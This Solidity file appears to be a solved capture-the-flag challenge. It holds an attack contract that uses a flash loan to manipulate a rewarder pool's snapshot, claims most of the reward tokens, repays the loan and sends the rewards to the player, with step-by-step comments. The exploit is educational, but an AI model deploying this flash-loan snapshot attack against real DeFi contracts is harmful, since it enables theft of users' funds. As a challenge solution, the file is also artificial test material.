// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

// The player may not have access to the original contracts, so the
// player should use these or other interfaces.
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IAccountingToken } from "./Interfaces/IAccountingToken.i.sol";
import { IFlashLoanerPool } from "./Interfaces/IFlashLoanerPool.i.sol";
import { IRewardToken } from "./Interfaces/IRewardToken.i.sol";
import { ITheRewarderPool } from "./Interfaces/ITheRewarderPool.i.sol";
import { ISleepViaVMWarp } from "./Interfaces/ISleepViaVMWarp.i.sol";

contract IAmAWinner {
    address private player;
    IERC20 private liquidityToken;
    IAccountingToken private accountingToken;
    IRewardToken private rewardToken;
    IFlashLoanerPool private flashLoanerPool;
    ITheRewarderPool private rewarderPool;
    ISleepViaVMWarp private time; // so the function call is time.sleep()

    constructor(
        address _liquidityToken,
        address _accountingToken,
        address _rewardToken,
        address _loanerPool,
        address _rewarderPool,
        address _sleeper,
        address _player
    ) payable {
        liquidityToken = IERC20(_liquidityToken);
        accountingToken = IAccountingToken(_accountingToken);
        rewardToken = IRewardToken(_rewardToken);
        flashLoanerPool = IFlashLoanerPool(_loanerPool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        time = ISleepViaVMWarp(_sleeper);
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // You may or may not need to add additional functions to this contract
        // in order to solve this challenge. You are free to modify this contract
        // however you want, it is your attack contract! All the test does is
        // create a new instance of this contract with the constructor args,
        // and then call the solveChallenge(), with the player EOA address
        // as the msg.sender.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // Wait 5 days for new rewards round
        time.sleep(60 * 60 * 24 * 5);

        // I wonder how to pass this impossible requirement! Maybe I should
        // sleep() on it...
        require(rewarderPool.isNewRewardsRound(), "Must wait 5 days between reward rounds.");
        // You must keep this somewhere inside this solveChallenge() function,
        // but it can be before, after, or in the middle of your solution code

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The key to this puzzle is that the Rewarder Pool takes a snapshot
        // in time to determine how many liquidity tokens a user has deposited.
        // Even though it is private, the _recordSnapshot() function can be
        // called by any external party via the distributeRewards() function,
        // or by the deposit() function which calls the distributeRewards().

        // Therefore, if the required 5 days have passed and nobody has called
        // the distributeRewards() function yet, we can call it ourselves.
        // And we can manipulate the snapshot amount by taking out a flash loan
        // and depositing it, taking the snapshot, and then withdrawing and
        // repaying the loan. This will allow us to claim most of the rewards.

        // 1. Take out a flash loan for the liquidity token
        flashLoanerPool.flashLoan(liquidityToken.balanceOf(address(flashLoanerPool)));

        // 2. The FlashLoanerPool flashloan calls our contract with
        //    "receiveFlashLoan(uint256)", so we must implement that function
        //    and use it until the flash loan is repaid.

        // ...receiveFlashLoan()...

        // 5. The flash loan has completed and the above function call ends,
        //    so we can continue to our next line of code, which is transferring
        //    the reward tokens to the player address.
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=zT5uNbGPaJ4
    }

    function receiveFlashLoan(uint256 amount) public {
        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // 2. The FlashLoanerPool has called this function with the amount
        //    of the loan.

        // 3. We deposit the borrowed liquidity token into the Rewarder Pool,
        //    which in turn calls the distributeRewards() function that takes a
        //    snapshot and distributes the rewards.
        //    But first we must approve the rewarderPool to transfer the
        //    liquidity token, since we are not calling the transfer() method
        //    ourself. The reward pool does the transfer, so we must approve.
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        // Just to be sure, let's validate that we got some reward tokens
        require(rewardToken.balanceOf(address(this)) > 0);

        // 4. We have gotten the reward tokens, so now we withdraw the liquidity
        //    token and repay the loan.
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);

        // 5. Now the flash loan is complete, and we jump back into the
        //    solveChallenge() function
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
